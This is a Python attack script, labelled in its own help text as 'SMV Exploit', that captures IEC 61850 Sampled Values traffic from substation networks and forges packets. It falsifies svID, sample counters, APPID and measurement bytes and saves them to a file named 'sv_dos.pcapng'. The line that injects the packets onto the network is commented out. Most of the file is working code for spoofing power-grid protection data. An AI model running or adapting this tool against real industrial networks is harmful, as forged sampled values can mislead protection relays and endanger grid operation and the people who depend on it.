# Imports 
import os, sys, datetime, inspect, struct, time, argparse, pyshark
from time import sleep
from scapy.layers.l2 import Ether, Dot1Q
import string, random

# Imp Imports
from pyasn1.type import univ, char, namedtype, tag, constraint
from pyasn1.codec.ber import decoder, encoder
from scapy.all import *

# Local imports
from smv.sv import SV
from smv.sv_pdu import SavPDU, SeqASDU, ASDU, UtcTime, Data


# network choice and filter
networkInterface = "eth1"
filter_string = "ether proto 0x88ba"
SV_TYPE = 0x88ba


# Tell the script where to find the the local modules
currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
parentdir = os.path.dirname(currentdir)
sys.path.insert(0, parentdir)


# Use argparse to parse the command line arguments
if len(sys.argv) < 2:
    print('[-] For help menu, use -h')
    sys.exit(1)

less_indent_formatter = lambda prog: argparse.RawTextHelpFormatter(prog, max_help_position=8)

parser = argparse.ArgumentParser(description='SMV Exploit.', formatter_class=less_indent_formatter, usage='python3 %(prog)s [options]')
parser.add_argument('--pcapfile', help='Name of the PCAP file to process.')
parser.add_argument('--livecapture', action='store_true', help='Start the live capture. (default: %(default)s)')
parser.add_argument('--store', help=""" Name the file to store the captured packets (should be with .pcap extension).""")
parser.add_argument('--output', help="""Name of the output file to save modified packets (should be with .pcap extension).
Some Examples: 
----------
    python3 %(prog)s --livecapture --store <filename>
    python3 %(prog)s --pcapfile <filename> --output <filename>
    
""")
args = parser.parse_args()



####  DEFINED FUNCTIONS   ####


# CONVERTING THE TIME INTO 64-BITS or 8-BYTES FORM
UTC = 1 # 0: local time 1: UTC Time
def curTime64Bits(utc=False):
    # Microsecond Resolution Ignored
    if UTC:
        curTime = time.mktime(datetime.datetime.utcnow().timetuple())
    else:
        curTime = time.mktime(datetime.datetime.now().timetuple())

    curTimeInt = int(curTime)
    curTimeInt64 = (curTimeInt << 32)
    curTimeInt64Str = curTimeInt64.to_bytes(8,'big')
    return curTimeInt64Str


# Check for SV packets
def sv_check(mod_pkt):
    is_sv = False
    if mod_pkt.haslayer(Ether): 
        if mod_pkt[Ether].type == SV_TYPE: is_sv = True
    if mod_pkt.haslayer(Dot1Q):
        if mod_pkt[Dot1Q].type == SV_TYPE: is_sv = True
    return is_sv


# Decode the packet
def decode_packet(encoded_data):
    
    savpdu = SavPDU().subtype(
        implicitTag = tag.Tag(
            tag.tagClassApplication,
            tag.tagFormatConstructed,
            0
        )
    )
    
    decoded_savpdu , rest_of_data = decoder.decode(
        encoded_data,
        asn1Spec=savpdu
    )
    
    return decoded_savpdu


# Filter packets based on the src and dst MAC addresses
def filter_packets(packet, src_mac, dst_mac):
    if packet.haslayer(Ether):
        if packet[Ether].src == src_mac and packet[Ether].dst == dst_mac:
            return True
    return False


####  INTERACTIVE PART  #####


# Read the given pcap file
if args.pcapfile:
    packets = rdpcap(args.pcapfile)
    print("\n[+] Reading pcap file... "); sleep(1)


# Live capture the packets from a live network
if args.livecapture:
    try:
        print(f"[+] Listening on {networkInterface}"); sleep(1)
        print("[+] YOU SHOULD HAVE SUDO PERMISSIONS TO DO THIS")
        count = int(input('How many packets do you want to capture?: '))
        print("[+] Capturing packets...")
        captureLive = pyshark.LiveCapture(
                interface=networkInterface, 
                bpf_filter=filter_string,
                output_file=args.store
        )

        #captureLive.set_debug()
        captureLive.sniff(packet_count=count)
        captureLive.close()
        print("[+] Capturing done..")
        print("[+] Using the pcap file just captured..")
        packets = rdpcap(args.store)

    except KeyboardInterrupt:
        print('\n[-] Exiting')
        sys.exit(1)


print("[+] Filtering SV packets... "); sleep(1)
print("[+] Decoding the packets... "); sleep(1)




# Store Data
sv_packets = []                 #  to store the SV packets
unique_sv_packets = set()       #  to store the SV packets for specific src and dst MAC addresses


# Extract the SV packets
for packet in packets:
    if sv_check(packet):
        # Add only sv packets to the list
        sv_packets.append(packet)
        
        # Add unique source and destination addresses to the set
        unique_sv_packets.add((packet[Ether].src, packet[Ether].dst))



# Printing a sample packet

perm = input("Do you want to print a sample SV packet?[Y/N]: ")
sample = sv_packets[0]
try:
    if perm in ['y', 'Y']:
        print("[+] Printing the packet details...\n"); sleep(1)
        encoded_data = sample.load
        decoded_savpdu = decode_packet(encoded_data)
        print(decoded_savpdu.prettyPrint())
    elif perm in ['n','N']:
        print("Okay, nvm!\n")
    else:
        print('Invalid Input\n')

except KeyboardInterrupt:
    print('[-] Exiting')



#### FILTERING THE PACKETS #### 

# Convert set of unique addresses to a list and print it
unique_addresses_list = list(unique_sv_packets)

print("\n[+] Scaning for unique source-destination connections..."); sleep(1)
print("Unique source and destination MAC addresses:")
for i, (src, dst) in enumerate(unique_addresses_list):
    print(f"{i+1}. Source: {src} --> Destination: {dst}")
   
print('\n') 
print(f"Select the destination you want to target in the range [1 to {len(unique_addresses_list)}]: ")
target = int(input("Choose the index:  "))
print('\n') 
sleep(1)

if 1 <= target <= len(unique_addresses_list):   
    src, dst = unique_addresses_list[target-1]
    print(f"Selected source MAC address: {src}")
    print(f"Selected destination MAC address: {dst}")
    print('\n') 

else:
    print("Invalid input!")
    exit(1)
    
    
filtered_packets = [packet for packet in sv_packets if filter_packets(packet, src, dst)]



##########  MODIFYING THE PACKETS  ##########

#### Packets WORKFLOW :)  ####
#  args.pcapfile --> packets --> sv_packets  --> filtered_packets --> packets_to_modify
#                            |
#                            |--> unique_sv_packets --> unique_addresses_list --> src, dst


## Selecting the packets to modify
print(f"[+] Select the packets you want to manipulate in the range of 0 to {len(filtered_packets)}.")
opt = int(input("What do you want to manipulate?\n1. Range\n2. Some packets\nChoose the option: "))

if opt == 1:
    start = int(input("Enter the start index: "))
    end = int(input("Enter the end index: "))
    packets_to_modify = filtered_packets[start:end]

elif opt == 2:
    print("Enter the indexes of the packets you want to modify: ")
    indexes = list(map(int, input().split()))
    packets_to_modify = [filtered_packets[i] for i in indexes]
    
else:
    print("Invalid input!")
    print('[-] Exiting')
    exit(1)



############ Manipulating and Injecting the packets #############


# mod_pkt = packets_to_modify[0]


# # Modification choices
# sv_id_range = int(input("\nEnter the range of svID you want to inject: "))
# smp_cnt_range = int(input("Enter the range of smpCnt you want to inject: "))    
       
# n = input("Do you want to inject the modified packets?[Y/N]: ")
# if n in ['y', 'Y']:
#     print("[+] Injecting the packets... ")
#     sleep(1)

print("[+] Modifying the packets... "); sleep(1)

mod_packets = packets_to_modify.copy()

packets_to_send = []

j = 0
for mod_pkt in mod_packets:
    
    # mod_packet_load_start_sv = mod_mod_pkt.load[:8] 
    
    ## Decoding the packet ##
    raw_data = mod_pkt.load
  
    decoded_savpdu = decode_packet(raw_data)

    # Extracting the ASDU ##
    seq_asdu = decoded_savpdu.getComponentByPosition(1)  
    asdu = seq_asdu.getComponentByPosition(0)  

    svID = asdu.getComponentByPosition(0)
    smp_cnt = asdu.getComponentByPosition(1)  
    confRev = asdu.getComponentByPosition(2)
    smp_sync = asdu.getComponentByPosition(3)
    seq_data = asdu.getComponentByPosition(4)

       
       
    #### Modification logic  ####



    # # Define the alphabet: lowercase and uppercase letters
    alphabet = string.ascii_letters  # This includes 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

    # Generate a random 3-character string
    random_string = ''.join(random.choice(alphabet) for _ in range(3))

       
    asdu.setComponentByName('svID', svID[:-3] + random_string )
    
    
    # asdu.setComponentByName('svID', int(svID) + 100)
    
    asdu.setComponentByName('smpCnt', j)
    j += 1
    
    # Modify the first 3 bytes of seq_data randomly
    seq_data = bytearray(seq_data)
    # for i in range(3):
    #     seq_data[i] = random.randint(0, 255)
        
    seq_data[0] = 0x00
    seq_data[1] = 0x00
    # seq_data[2] = 0x00  
    seq_data[2] = random.randint(0, 25)    
        
    seq_data = bytes(seq_data)
    asdu.setComponentByName('seqData', seq_data)
    
    

        ### Encoding the modified packet ###
    encoded_data = encoder.encode(decoded_savpdu)
    
    # mod_mod_pkt.load = mod_packet_load_start_sv + encoded_data
    
    
    #         ## Packet formation ##
        
        
    #       # original packet data 

    # ether data 
    src = mod_pkt.src
    dst = mod_pkt.dst
    type = mod_pkt.type

    # # Dot1Q data
    # Prio = mod_pkt[Dot1Q].prio
    # Id = mod_pkt[Dot1Q].id
    # Vlan = mod_pkt[Dot1Q].vlan
    # Type = mod_pkt[Dot1Q].type

    # SV data
    Appid =  mod_pkt[SV].appid         + j
    Length = mod_pkt[SV].length
    Reserved1 = mod_pkt[SV].reserved1
    Reserved2 = mod_pkt[SV].reserved2

  
    # constructing the modified packet
    # mod_packet = Ether(src=src, dst=dst, type=type)/Dot1Q(prio = Prio, id= Id, vlan=Vlan, type=Type)/SV(appid=Appid, length=Length, reserved1 = Reserved1,reserved2=Reserved2)/encoded_data
    mod_packet = Ether(src=src, dst=dst, type=type)/SV(appid=Appid, length=Length, reserved1 = Reserved1,reserved2=Reserved2)/encoded_data
    
    packets_to_send.append(mod_packet)
    
    
    
  
print("[+] Packets modified successfully! "); sleep(1)
print("[+] Saving the modified packets... "); sleep(1)    
       
       
       
for pkt in packets_to_send:
    # sendp(pkt, iface=networkInterface)
    wrpcap("sv_dos.pcapng", pkt, append=True)



# print(f"\n[+] {flag} Packets injected successfully! ");     sleep(1)
print("[+] Exiting...")